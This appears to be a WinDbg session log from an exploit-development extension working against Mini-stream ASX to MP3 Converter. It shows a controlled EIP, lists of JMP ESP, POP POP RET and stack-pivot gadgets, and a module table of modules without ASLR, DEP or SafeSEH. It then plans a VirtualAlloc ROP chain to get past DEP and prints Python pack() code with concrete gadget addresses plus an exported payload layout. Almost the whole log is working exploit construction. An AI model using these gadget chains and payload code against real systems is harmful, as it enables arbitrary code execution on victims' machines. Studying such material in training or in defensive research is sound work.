```txt
0:000> dx @$osed().triage()

=== CONTROL ===
EIP controlled: yes
Offset: n/a
Pattern: n/a

=== SEH ===
Overwritten: no
Next SEH: n/a
Handler: n/a
Status: SEH chain is empty.

=== STACK ===
esp: 0x000FC480
Bad stack pointer: no
SP points into cyclic pattern: no
Stack protect: PAGE_READWRITE
DEP enforced: yes
Shellcode candidates: none

=== GADGETS ===
JMP ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2B95A
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x314E7
  C:\Windows\system32\wpdshext.dll+0xA548
  C:\Windows\system32\wpdshext.dll+0x7407F
  C:\Windows\system32\wpdshext.dll+0x74193
CALL ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll+0x371F5
  C:\Windows\system32\wpdshext.dll+0x75D7F
  C:\Windows\system32\wpdshext.dll+0x76143
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0x3F9D
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0xCBAF
POP POP RET:
  C:\Windows\system32\d3d11.dll+0x5C834
  C:\Windows\System32\KERNELBASE.dll+0x1BA2DD
  C:\Windows\System32\ADVAPI32.dll+0x25385
  C:\Windows\System32\combase.dll+0xE0E00
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll+0x50C23
Stack pivots:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x87FC
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C14
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C51
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x9923
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0xC0A3

=== CONTEXT ===
Exception code: n/a
eip: 0x41414141

=== MODULE SCORE ===
Module                                                                  Score   ASLR      NX_COMPAT   SafeSEH   System  
----------------------------------------------------------------------  ------  --------  ----------  --------  --------
C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe  100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec02.dll      100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mctn01.dll        100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\msvos.dll             100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter02.dll     100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSLog.dll             100     disabled  disabled    disabled  no      

=== BADCHAR QUICK SCAN ===
Byte      Count   FirstOff
--------  ------  --------
0x00      0       n/a     
0x0A      0       n/a     
0x0D      0       n/a     
@$osed().triage() : true
```

```text
0:000> dx @$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D", true)

=== Module Scan ===
[+] MSA2Mfilter03.dll: 2038 raw gadgets accepted, -1404 rejected

=== Corpus Summary ===
[+] Mode: append
[+] Modules: MSA2Mfilter03.dll
[+] Semantic gadgets: 362 (deduplicated)
[+] Capabilities: 178
[+] Backward scanner: 2533 terminators, 1867 new gadgets
@$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D", true)                 : Live ROP Corpus: 2 rows
    title            : Live ROP Corpus
    rows             : Live ROP Corpus: 2 rows; expand rows[N] for details
    length           : 0x2
```

```text
0:000> dx @$osed().rop.capabilities()

=== ROP Capabilities ===
Kind                    Register  Target      Count
----------------------  --------  ----------  -----
DISPATCH_CALL_MEMORY                          4    
DISPATCH_CALL_REGISTER  eax                   2    
DISPATCH_CALL_REGISTER  ebp                   1    
DISPATCH_CALL_REGISTER  ebx                   1    
DISPATCH_CALL_REGISTER  edi                   1    
DISPATCH_CALL_REGISTER  edx                   1    
DISPATCH_CALL_REGISTER  esi                   1    
DISPATCH_CALL_REGISTER  esp                   1    
DISPATCH_JMP_REGISTER   eax                   1    
DISPATCH_PUSHAD                               1    
DISPATCH_RET                                  350  
EXCHANGE_REGISTER       eax       esp         1    
LOAD_CONSTANT           eax                   12   
LOAD_CONSTANT           ebp                   72   
LOAD_CONSTANT           ebx                   119  
LOAD_CONSTANT           ecx                   25   
LOAD_CONSTANT           edi                   51   
LOAD_CONSTANT           edx                   4    
LOAD_CONSTANT           esi                   100  
LOAD_CONSTANT           esp                   1    
LOAD_MEMORY             eax                   1    
LOAD_REGISTER           eax                   12   
LOAD_REGISTER           ebp                   72   
LOAD_REGISTER           ebx                   119  
LOAD_REGISTER           ecx                   25   
LOAD_REGISTER           edi                   51   
LOAD_REGISTER           edx                   4    
LOAD_REGISTER           esi                   100  
LOAD_REGISTER           esp                   1    
MEMORY_READ             eax                   1    
MEMORY_WRITE            eax                   1    
MEMORY_WRITE            ecx                   2    
MEMORY_WRITE            edx                   1    
MOVE_REGISTER           eax       ebp         1    
MOVE_REGISTER           eax       ebx         3    
MOVE_REGISTER           eax       ecx         6    
MOVE_REGISTER           eax       edi         1    
MOVE_REGISTER           eax       edx         4    
MOVE_REGISTER           eax       esi         9    
MOVE_REGISTER           esp       ebp         3    
REGISTER_ADC            eax       0x1005d034  1    
REGISTER_ADC            eax       0x1005d038  2    
REGISTER_ADC            eax       0x1005d03c  1    
REGISTER_ADC            eax       0x1005d074  2    
REGISTER_ADC            eax       0x1005d0b4  1    
REGISTER_ADC            eax       0x10071690  1    
REGISTER_ADC            eax       0x100764de  1    
REGISTER_ADC            eax       0x100764e0  1    
REGISTER_ADC            eax       0x5e000004  1    
REGISTER_ADC            eax       0x8b000001  1    
REGISTER_ADC            eax       0xe58b0000  1    
REGISTER_ADD            eax       0x100       1    
REGISTER_ADD            eax       0x10073c34  2    
REGISTER_ADD            eax       0x100878c8  1    
REGISTER_ADD            eax       0x3         1    
REGISTER_ADD            eax       0x4         4    
REGISTER_ADD            eax       0x40        1    
REGISTER_ADD            eax       0x424442b   1    
REGISTER_ADD            eax       0x58016a10  1    
REGISTER_ADD            eax       0x5b5d5e5f  1    
REGISTER_ADD            eax       0x5d000000  1    
REGISTER_ADD            eax       0x5d58016a  1    
REGISTER_ADD            eax       0x5d58046a  2    
REGISTER_ADD            eax       0x5d5e5f10  1    
REGISTER_ADD            eax       0x5dff0883  1    
REGISTER_ADD            eax       0x5e58016a  2    
REGISTER_ADD            eax       0x5ec0335f  1    
REGISTER_ADD            eax       0x5effc883  1    
REGISTER_ADD            eax       0x74085539  1    
REGISTER_ADD            eax       0x74c08510  1    
REGISTER_ADD            eax       0x75015038  1    
REGISTER_ADD            eax       0x8         2    
REGISTER_ADD            eax       0x80        2    
REGISTER_ADD            eax       0x8b5fdf8b  1    
REGISTER_ADD            eax       0xbe0f0000  1    
REGISTER_ADD            eax       0xc958016a  1    
REGISTER_ADD            eax       0xd0ff006a  2    
REGISTER_ADD            eax       0xe58b0000  1    
REGISTER_ADD            eax       0xffffffcd  5    
REGISTER_ADD            eax       0xfffffffe  1    
REGISTER_ADD            eax       ebp         1    
REGISTER_ADD            eax       ecx         1    
REGISTER_ADD            eax       esi         1    
REGISTER_ADD            ebx       esi         1    
REGISTER_ADD            ecx       ecx         1    
REGISTER_ADD            edx       ebx         1    
REGISTER_ADD            esp       0x10        15   
REGISTER_ADD            esp       0x14        4    
REGISTER_ADD            esp       0x1c        1    
REGISTER_ADD            esp       0x20        7    
REGISTER_ADD            esp       0x24        6    
REGISTER_ADD            esp       0x28        3    
REGISTER_ADD            esp       0x2c        3    
REGISTER_ADD            esp       0x30        3    
REGISTER_ADD            esp       0x4         6    
REGISTER_ADD            esp       0x40        7    
REGISTER_ADD            esp       0x44        4    
REGISTER_ADD            esp       0x4c        4    
REGISTER_ADD            esp       0x5c        4    
REGISTER_ADD            esp       0x64        5    
REGISTER_ADD            esp       0x8         11   
REGISTER_ADD            esp       0xc         18   
REGISTER_ADD            esp       ebx         1    
REGISTER_AND            eax       0x33        3    
REGISTER_AND            eax       0x40        1    
REGISTER_AND            eax       0x7fff      1    
REGISTER_AND            eax       0x8         2    
REGISTER_AND            eax       0xc603c000  1    
REGISTER_AND            eax       0xe58b0001  1    
REGISTER_AND            eax       0xffff      1    
REGISTER_AND            eax       ebx         1    
REGISTER_AND            eax       ecx         5    
REGISTER_DECREMENT      eax                   1    
REGISTER_DECREMENT      edi                   1    
REGISTER_DECREMENT      esp                   2    
REGISTER_INCREMENT      eax                   2    
REGISTER_INCREMENT      ebp                   1    
REGISTER_INCREMENT      ecx                   1    
REGISTER_INCREMENT      esp                   1    
REGISTER_NEGATE         eax                   2    
REGISTER_NEGATE         ecx                   1    
REGISTER_NOT            eax                   1    
REGISTER_OR             eax       0x40000     1    
REGISTER_OR             eax       0xe58b0000  1    
REGISTER_OR             eax       0xe58b0002  1    
REGISTER_OR             eax       0xffffffff  20   
REGISTER_OR             eax       eax         1    
REGISTER_OR             eax       ecx         1    
REGISTER_OR             eax       edi         1    
REGISTER_OR             ecx       edx         1    
REGISTER_OR             esi       esi         2    
REGISTER_SBB            eax       0x5f014e88  2    
REGISTER_SBB            eax       0xe58b0000  1    
REGISTER_SBB            eax       0xe58b0001  1    
REGISTER_SBB            eax       0xe58b0002  1    
REGISTER_SBB            eax       0xffffffff  2    
REGISTER_SBB            eax       eax         3    
REGISTER_SBB            ecx       ecx         2    
REGISTER_SBB            edx       0x0         3    
REGISTER_SUB            eax       0x10073bb0  1    
REGISTER_SUB            eax       0x10073bba  1    
REGISTER_SUB            eax       0xe58b0000  2    
REGISTER_SUB            eax       0xe58b0001  1    
REGISTER_SUB            eax       0xe58b0002  1    
REGISTER_SUB            eax       ecx         1    
REGISTER_SUB            ebp       ebx         1    
REGISTER_SUB            esi       0x7         1    
REGISTER_SWAP           eax       esp         1    
REGISTER_TRANSFER       eax       ebp         1    
REGISTER_TRANSFER       eax       ebx         3    
REGISTER_TRANSFER       eax       ecx         6    
REGISTER_TRANSFER       eax       edi         1    
REGISTER_TRANSFER       eax       edx         4    
REGISTER_TRANSFER       eax       esi         9    
REGISTER_TRANSFER       esp       ebp         3    
REGISTER_XOR            eax       0xe58b0001  1    
REGISTER_XOR            eax       eax         39   
REGISTER_XOR            edx       edx         2    
REGISTER_ZERO           eax                   39   
REGISTER_ZERO           edx                   2    
STACK_ADJUST                                  114  
STACK_COPY              esp       ebp         3    
STACK_PIVOT                                   29   
STACK_READ              eax                   12   
STACK_READ              ebp                   72   
STACK_READ              ebx                   119  
STACK_READ              ecx                   25   
STACK_READ              edi                   51   
STACK_READ              edx                   4    
STACK_READ              esi                   100  
STACK_READ              esp                   1    
STACK_WRITE                                   1    
STACK_WRITE             ebp                   1    
STORE_MEMORY            eax                   1    
STORE_MEMORY            ecx                   2    
STORE_MEMORY            edx                   1    
ZERO_REGISTER           eax                   39   
ZERO_REGISTER           edx                   2    
@$osed().rop.capabilities()                 : ROP Capabilities: 178 rows
    title            : ROP Capabilities
    rows             : ROP Capabilities: 178 rows; expand rows[N] for details
    length           : 0xb2
```

```text
0:000> dx @$osed().rop.plan("VirtualAlloc")

=== ROP Plan 1: VirtualAlloc ===
Plan  Strategy      Shape                    Possible  Feasibility              Recommended  Complexity  Required                               Satisfied                              Missing  Preconditions                                                                                                                                                                                                                                                               Reason                                                                          
----  ------------  -----------------------  --------  -----------------------  -----------  ----------  -------------------------------------  -------------------------------------  -------  --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  --------------------------------------------------------------------------------
1     VirtualAlloc  SYNTHETIC_STDCALL_FRAME  yes       exploit-state-dependent  yes          LOW         DISPATCH_RET                           DISPATCH_RET                                    EIP is controlled (e.g. via SEH overwrite or saved return address). | ESP points to or can reach a region with 24+ contiguous controlled bytes. | VirtualAlloc address is known or resolvable at exploit time. | All frame values are encodable under the current charset.  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  STACK_PIVOT_FRAME        yes       exploit-state-dependent               LOW         STACK_PIVOT, DISPATCH_RET              STACK_PIVOT, DISPATCH_RET                       A controlled, writable memory region can hold the synthetic frame. | The pivot source register or memory contains a valid pointer to the controlled region. | VirtualAlloc address is known or resolvable at exploit time.                                                  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  RET_DISPATCH             yes       exploit-state-dependent               LOW         DISPATCH_RET                           DISPATCH_RET                                    ESP points to a controlled region large enough for the stdcall frame. | VirtualAlloc address is encodable and placed at ESP when ret executes. | Stdcall arguments follow the API address on the stack.                                                                     All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  PUSHAD_DISPATCH          yes       exploit-state-dependent               MEDIUM      LOAD_CONSTANT, DISPATCH_PUSHAD         LOAD_CONSTANT, DISPATCH_PUSHAD                  Registers can be loaded with the required API arguments via pop gadgets. | The PUSHAD stack layout matches the VirtualAlloc stdcall ABI. | ESP at pushad time points into the shellcode or NOP sled (used as lpAddress).                                                    All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  CALL_REGISTER            yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_CALL_REGISTER  LOAD_CONSTANT, DISPATCH_CALL_REGISTER           The API address must be loaded into the dispatch register before call. | A valid stdcall frame for VirtualAlloc must exist at [ESP] when call executes (return addr is pushed by call). | The call target must not clobber registers or stack state needed by the API.      All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  JMP_REGISTER             yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_JMP_REGISTER   LOAD_CONSTANT, DISPATCH_JMP_REGISTER            The API address must be loaded into the dispatch register before jmp. | ESP must point to: [RETURN_ADDR][arg1][arg2]... since jmp does not push a return address. | The full VirtualAlloc stdcall frame must already be on the stack.                                       All required capabilities present. Exploit-state preconditions must be verified.
@$osed().rop.plan("VirtualAlloc")                 : ROP Plan 1: 6 rows
    title            : ROP Plan 1
    rows             : ROP Plan 1: 6 rows; expand rows[N] for details
    length           : 0x6
```

```text
0:000> dx @$osed().rop.synthesize(1, "SYNTHETIC_STDCALL_FRAME")

=== ROP Synthesize 1 ===
[+] Path: DIRECT_API
[+] Status: complete-with-violations
[+] Layout: produced
[+] Constraint compatible: no
[+] Strategy: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
[+] Total: 24 bytes
[+] Resolve before use: VIRTUALALLOC, RETURN_ADDR, LP_ADDRESS
[!] VIOLATION: dwSize: 0x00000201 contains badchar byte(s) 0x00.
[!] VIOLATION: flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.
[!] VIOLATION: flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
[!] RETURN_ADDR: placeholder value must be checked against badchars after resolution.
[!] LP_ADDRESS: placeholder value must be checked against badchars after resolution.
[!] VIRTUALALLOC: saved EIP must contain the API address; check against badchars after resolution.
[+] Operator action: synthesize values arithmetically, use writable memory construction, or select an alternate strategy.

=== ROP Synthesize 1 ===
Plan  Strategy                                Status                    Path        Layout    Compatible  Offset  Role                   Word          Comment                                      Diagnostic  Detail                                                                       
----  --------------------------------------  ------------------------  ----------  --------  ----------  ------  ---------------------  ------------  -------------------------------------------  ----------  -----------------------------------------------------------------------------
1     VirtualAlloc / SYNTHETIC_STDCALL_FRAME  complete-with-violations  DIRECT_API  produced  no                                                                                                                                                                                             
                                                                                                          -4      saved-eip              VIRTUALALLOC  saved EIP = VirtualAlloc (direct overwrite)                                                                                           
                                                                                                          +0      return-address         RETURN_ADDR   return address                                                                                                                        
                                                                                                          +4      arg1-lpAddress         LP_ADDRESS    lpAddress                                                                                                                             
                                                                                                          +8      arg2-dwSize            0x00000201    dwSize                                                                                                                                
                                                                                                          +12     arg3-flAllocationType  0x00001000    flAllocationType = MEM_COMMIT                                                                                                         
                                                                                                          +16     arg4-flProtect         0x00000040    flProtect = PAGE_EXECUTE_READWRITE                                                                                                    
                                                                                                                                                                                                    VIOLATION   dwSize: 0x00000201 contains badchar byte(s) 0x00.                            
                                                                                                                                                                                                    VIOLATION   flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.     
                                                                                                                                                                                                    VIOLATION   flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
@$osed().rop.synthesize(1, "SYNTHETIC_STDCALL_FRAME")                 : ROP Synthesize 1: 10 rows
    title            : ROP Synthesize 1
    rows             : ROP Synthesize 1: 10 rows; expand rows[N] for details
    length           : 0xa
```

```text
0:000> dx @$osed().rop.construct("ebx", 0x201, "00 0A 0D")

=== Value Construction: ebx = 0x00000201 ===
[+] Recipe: two-add | Stack: 20 bytes | Scratch: esi
from struct import pack
rop = b""
rop += pack("<I", 0x10031659)  # pop ebx
rop += pack("<I", 0x02020202)  # ebx = 0x02020202
rop += pack("<I", 0x100176E2)  # pop esi
rop += pack("<I", 0xFDFDFFFF)  # esi = 0xFDFDFFFF
rop += pack("<I", 0x10030C6F)  # add ebx, esi -> 0x00000201

=== Value Construction ===
Type    Value       Meaning                   
------  ----------  --------------------------
gadget  0x10031659  pop ebx                   
value   0x02020202  ebx = 0x02020202          
gadget  0x100176E2  pop esi                   
value   0xFDFDFFFF  esi = 0xFDFDFFFF          
gadget  0x10030C6F  add ebx, esi -> 0x00000201
@$osed().rop.construct("ebx", 0x201, "00 0A 0D")                 : Value Construction: 5 rows
    title            : Value Construction
    rows             : Value Construction: 5 rows; expand rows[N] for details
    length           : 0x5
0:000> dx @$osed().rop.construct("edx", 0x40, "00 0A 0D")

=== Value Construction: edx = 0x00000040 ===
[+] Recipe: two-add | Stack: 40 bytes | Scratch: ebx
from struct import pack
rop = b""
rop += pack("<I", 0x10029697)  # pop edx
rop += pack("<I", 0x01010101)  # edx = 0x01010101
rop += pack("<I", 0x10031659)  # pop ebx
rop += pack("<I", 0xFEFEFF3F)  # ebx = 0xFEFEFF3F
rop += pack("<I", 0x10029F3E)  # add edx, ebx -> 0x00000040
rop += pack("<I", 0x41414141)  # junk (ebx side effect)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)
rop += pack("<I", 0x41414141)  # padding (ret 16 compensation)

=== Value Construction ===
Type    Value       Meaning                      
------  ----------  -----------------------------
gadget  0x10029697  pop edx                      
value   0x01010101  edx = 0x01010101             
gadget  0x10031659  pop ebx                      
value   0xFEFEFF3F  ebx = 0xFEFEFF3F             
gadget  0x10029F3E  add edx, ebx -> 0x00000040   
value   0x41414141  junk (ebx side effect)       
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
value   0x41414141  padding (ret 16 compensation)
@$osed().rop.construct("edx", 0x40, "00 0A 0D")                 : Value Construction: 10 rows
    title            : Value Construction
    rows             : Value Construction: 10 rows; expand rows[N] for details
    length           : 0xa
```

```text
0:000> dx @$osed().rop.export(1)

=== ROP Export 1 ===
#!/usr/bin/env python3
# osed-windbg ROP export — plan 1: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
#
# Stack layout for plan 1: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
# Entry path: DIRECT_API
# Status: complete-with-violations
# TODO: resolve placeholders: VIRTUALALLOC, RETURN_ADDR, LP_ADDRESS
# WARNING: dwSize: 0x00000201 contains badchar byte(s) 0x00.
# WARNING: flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.
# WARNING: flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.

from struct import pack
payload = b""
payload += pack("<I", VIRTUALALLOC)  # [-4] saved-eip: saved EIP = VirtualAlloc (direct overwrite)
payload += pack("<I", RETURN_ADDR)  # [+0] return-address: return address
payload += pack("<I", LP_ADDRESS)  # [+4] arg1-lpAddress: lpAddress
payload += pack("<I", 0x00000201)  # [+8] arg2-dwSize: dwSize
payload += pack("<I", 0x00001000)  # [+12] arg3-flAllocationType: flAllocationType = MEM_COMMIT
payload += pack("<I", 0x00000040)  # [+16] arg4-flProtect: flProtect = PAGE_EXECUTE_READWRITE


=== ROP Export 1 ===
Plan  Strategy                                Gadgets  Layout   File     
----  --------------------------------------  -------  -------  ---------
1     VirtualAlloc / SYNTHETIC_STDCALL_FRAME  1        6 slots  (console)
@$osed().rop.export(1)                 : ROP Export 1: 1 row
    title            : ROP Export 1
    rows             : ROP Export 1: 1 row; expand rows[N] for details
    length           : 0x1
```
